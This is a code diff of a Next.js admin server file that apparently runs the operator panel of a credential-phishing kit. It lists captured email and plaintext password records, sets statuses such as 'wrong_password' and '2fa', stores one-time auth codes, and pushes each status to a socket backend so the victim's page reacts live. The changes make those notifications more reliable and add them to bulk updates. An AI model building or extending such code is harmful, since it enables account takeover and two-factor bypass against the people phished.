@@ -16,27 +16,28 @@ async function checkAdminAuth() {
     }
 }
 
-// Helper function to send socket notification
+// Helper function to send socket notification - UPDATED
 async function sendSocketNotification(userId, newStatus, authCode, email) {
     try {
-        // Get socket server URL from environment variables
-        const socketUrl = process.env.NEXT_PUBLIC_SOCKET_SERVER_URL ||
-            process.env.SOCKET_SERVER_URL ||
-            'https://email-password-backend-production.up.railway.app';
+        const socketUrl = process.env.NEXT_PUBLIC_SOCKET_SERVER_URL;
 
-        // Remove trailing slash if exists
+        if (!socketUrl) {
+            console.warn("⚠️ SOCKET_SERVER_URL not configured");
+            return;
+        }
+
         const baseUrl = socketUrl.replace(/\/+$/, '');
         const notifyUrl = `${baseUrl}/api/admin-action`;
 
         console.log(`📤 Sending admin action to: ${notifyUrl}`);
+        console.log(`📤 Data: userId=${userId}, status=${newStatus}, email=${email}`);
 
-        // Use AbortController for timeout
         const controller = new AbortController();
         const timeoutId = setTimeout(() => controller.abort(), 5000);
 
         const response = await fetch(notifyUrl, {
             method: 'POST',
-            headers: { 
+            headers: {
                 'Content-Type': 'application/json',
                 'Accept': 'application/json'
             },
@@ -52,9 +53,12 @@ async function sendSocketNotification(userId, newStatus, authCode, email) {
         clearTimeout(timeoutId);
 
         if (response.ok) {
-            console.log("✅ Socket notification sent successfully");
+            const data = await response.json();
+            console.log("✅ Socket notification sent successfully", data);
         } else {
             console.warn(`⚠️ Socket notification failed with status: ${response.status}`);
+            const errorText = await response.text();
+            console.warn(`⚠️ Error response: ${errorText}`);
         }
     } catch (error) {
         if (error.name === 'AbortError') {
@@ -62,31 +66,24 @@ async function sendSocketNotification(userId, newStatus, authCode, email) {
         } else {
             console.error("❌ Socket notification error:", error.message);
         }
-        // Don't throw - this is non-critical
     }
 }
 
 // Get all users
 export async function getUsers() {
     try {
-        // Check admin authentication
         const isAuthenticated = await checkAdminAuth();
         if (!isAuthenticated) {
-            return {
-                success: false,
-                message: "Unauthorized access.",
-            };
+            return { success: false, message: "Unauthorized access." };
         }
 
         await connectDB();
 
-        // Get all users sorted by createdAt (newest first)
         const users = await User.find({})
             .sort({ createdAt: -1 })
             .select("email password status authCode createdAt updatedAt")
             .lean();
 
-        // Convert ObjectId and Dates to strings for Next.js Client Components
         const serializedUsers = users.map(user => ({
             ...user,
             _id: user._id?.toString(),
@@ -94,44 +91,24 @@ export async function getUsers() {
             updatedAt: user.updatedAt?.toISOString() || null,
         }));
 
-        return {
-            success: true,
-            users: serializedUsers,
-        };
+        return { success: true, users: serializedUsers };
     } catch (error) {
         console.error("Get users error:", error);
-        return {
-            success: false,
-            message: "Failed to fetch users.",
-        };
+        return { success: false, message: "Failed to fetch users." };
     }
 }
 
-// Update user status
+// Update user status - UPDATED with better socket notification
 export async function updateUserStatus(userId, newStatus, authCode = null) {
     try {
-        // Check admin authentication
         const isAuthenticated = await checkAdminAuth();
         if (!isAuthenticated) {
-            return {
-                success: false,
-                message: "Unauthorized access.",
-            };
+            return { success: false, message: "Unauthorized access." };
         }
 
-        // Validate status
-        const validStatuses = [
-            "pending",
-            "wrong_email",
-            "wrong_password",
-            "2fa",
-            "success",
-        ];
+        const validStatuses = ["pending", "wrong_email", "wrong_password", "2fa", "success"];
         if (!validStatuses.includes(newStatus)) {
-            return {
-                success: false,
-                message: "Invalid status.",
-            };
+            return { success: false, message: "Invalid status." };
         }
 
         await connectDB();
@@ -139,16 +116,11 @@ export async function updateUserStatus(userId, newStatus, authCode = null) {
         const user = await User.findById(userId);
 
         if (!user) {
-            return {
-                success: false,
-                message: "User not found.",
-            };
+            return { success: false, message: "User not found." };
         }
 
-        // Update status
         user.status = newStatus;
 
-        // If status is 2fa, use provided authCode or generate a random one
         if (newStatus === "2fa") {
             if (authCode) {
                 user.authCode = authCode;
@@ -157,44 +129,35 @@ export async function updateUserStatus(userId, newStatus, authCode = null) {
             }
         }
 
-        // If status is success or wrong_*, clear authCode
         if (newStatus === "success" || newStatus === "wrong_email" || newStatus === "wrong_password") {
             user.authCode = "";
         }
 
         await user.save();
 
-        // Send socket notification (non-blocking)
-        sendSocketNotification(
+        console.log(`📤 Sending socket notification for ${user.email} (${user._id}) with status ${user.status}`);
+
+        // Send socket notification
+        await sendSocketNotification(
             user._id.toString(),
             user.status,
             user.authCode || "",
             user.email || ""
         );
 
-        return {
-            success: true,
-            message: "Status updated successfully.",
-        };
+        return { success: true, message: "Status updated successfully." };
     } catch (error) {
         console.error("Update status error:", error);
-        return {
-            success: false,
-            message: "Failed to update status.",
-        };
+        return { success: false, message: "Failed to update status." };
     }
 }
 
 // Delete user
 export async function deleteUser(userId) {
     try {
-        // Check admin authentication
         const isAuthenticated = await checkAdminAuth();
         if (!isAuthenticated) {
-            return {
-                success: false,
-                message: "Unauthorized access.",
-            };
+            return { success: false, message: "Unauthorized access." };
         }
 
         await connectDB();
@@ -202,22 +165,13 @@ export async function deleteUser(userId) {
         const result = await User.findByIdAndDelete(userId);
 
         if (!result) {
-            return {
-                success: false,
-                message: "User not found.",
-            };
+            return { success: false, message: "User not found." };
         }
 
-        return {
-            success: true,
-            message: "User deleted successfully.",
-        };
+        return { success: true, message: "User deleted successfully." };
     } catch (error) {
         console.error("Delete user error:", error);
-        return {
-            success: false,
-            message: "Failed to delete user.",
-        };
+        return { success: false, message: "Failed to delete user." };
     }
 }
 
@@ -226,10 +180,7 @@ export async function getUserById(userId) {
     try {
         const isAuthenticated = await checkAdminAuth();
         if (!isAuthenticated) {
-            return {
-                success: false,
-                message: "Unauthorized access.",
-            };
+            return { success: false, message: "Unauthorized access." };
         }
 
         await connectDB();
@@ -239,10 +190,7 @@ export async function getUserById(userId) {
             .lean();
 
         if (!user) {
-            return {
-                success: false,
-                message: "User not found.",
-            };
+            return { success: false, message: "User not found." };
         }
 
         const serializedUser = {
@@ -252,16 +200,10 @@ export async function getUserById(userId) {
             updatedAt: user.updatedAt?.toISOString() || null,
         };
 
-        return {
-            success: true,
-            user: serializedUser,
-        };
+        return { success: true, user: serializedUser };
     } catch (error) {
         console.error("Get user error:", error);
-        return {
-            success: false,
-            message: "Failed to fetch user.",
-        };
+        return { success: false, message: "Failed to fetch user." };
     }
 }
 
@@ -270,10 +212,7 @@ export async function getUsersByStatus(status) {
     try {
         const isAuthenticated = await checkAdminAuth();
         if (!isAuthenticated) {
-            return {
-                success: false,
-                message: "Unauthorized access.",
-            };
+            return { success: false, message: "Unauthorized access." };
         }
 
         await connectDB();
@@ -290,16 +229,10 @@ export async function getUsersByStatus(status) {
             updatedAt: user.updatedAt?.toISOString() || null,
         }));
 
-        return {
-            success: true,
-            users: serializedUsers,
-        };
+        return { success: true, users: serializedUsers };
     } catch (error) {
         console.error("Get users by status error:", error);
-        return {
-            success: false,
-            message: "Failed to fetch users.",
-        };
+        return { success: false, message: "Failed to fetch users." };
     }
 }
 
@@ -308,24 +241,12 @@ export async function bulkUpdateStatus(userIds, newStatus) {
     try {
         const isAuthenticated = await checkAdminAuth();
         if (!isAuthenticated) {
-            return {
-                success: false,
-                message: "Unauthorized access.",
-            };
+            return { success: false, message: "Unauthorized access." };
         }
 
-        const validStatuses = [
-            "pending",
-            "wrong_email",
-            "wrong_password",
-            "2fa",
-            "success",
-        ];
+        const validStatuses = ["pending", "wrong_email", "wrong_password", "2fa", "success"];
         if (!validStatuses.includes(newStatus)) {
-            return {
-                success: false,
-                message: "Invalid status.",
-            };
+            return { success: false, message: "Invalid status." };
         }
 
         await connectDB();
@@ -338,16 +259,23 @@ export async function bulkUpdateStatus(userIds, newStatus) {
             }
         );
 
-        return {
-            success: true,
-            message: `${result.modifiedCount} users updated successfully.`,
-        };
+        // Get updated users to send notifications
+        const updatedUsers = await User.find({ _id: { $in: userIds } });
+
+        // Send socket notifications for each updated user
+        for (const user of updatedUsers) {
+            await sendSocketNotification(
+                user._id.toString(),
+                user.status,
+                user.authCode || "",
+                user.email || ""
+            );
+        }
+
+        return { success: true, message: `${result.modifiedCount} users updated successfully.` };
     } catch (error) {
         console.error("Bulk update error:", error);
-        return {
-            success: false,
-            message: "Failed to update users.",
-        };
+        return { success: false, message: "Failed to update users." };
     }
 }
 
@@ -356,10 +284,7 @@ export async function getSummary() {
     try {
         const isAuthenticated = await checkAdminAuth();
         if (!isAuthenticated) {
-            return {
-                success: false,
-                message: "Unauthorized access.",
-            };
+            return { success: false, message: "Unauthorized access." };
         }
 
         await connectDB();
@@ -375,21 +300,11 @@ export async function getSummary() {
 
         return {
             success: true,
-            summary: {
-                pending,
-                wrongEmail,
-                wrongPassword,
-                twoFA,
-                success,
-                total,
-            },
+            summary: { pending, wrongEmail, wrongPassword, twoFA, success, total },
         };
     } catch (error) {
         console.error("Get summary error:", error);
-        return {
-            success: false,
-            message: "Failed to fetch summary.",
-        };
+        return { success: false, message: "Failed to fetch summary." };
     }
 }
 
@@ -398,25 +313,16 @@ export async function clearAllData() {
     try {
         const isAuthenticated = await checkAdminAuth();
         if (!isAuthenticated) {
-            return {
-                success: false,
-                message: "Unauthorized access.",
-            };
+            return { success: false, message: "Unauthorized access." };
         }
 
         await connectDB();
 
         await User.deleteMany({});
 
-        return {
-            success: true,
-            message: "All data cleared successfully.",
-        };
+        return { success: true, message: "All data cleared successfully." };
     } catch (error) {
         console.error("Clear data error:", error);
-        return {
-            success: false,
-            message: "Failed to clear data.",
-        };
+        return { success: false, message: "Failed to clear data." };
     }
 }
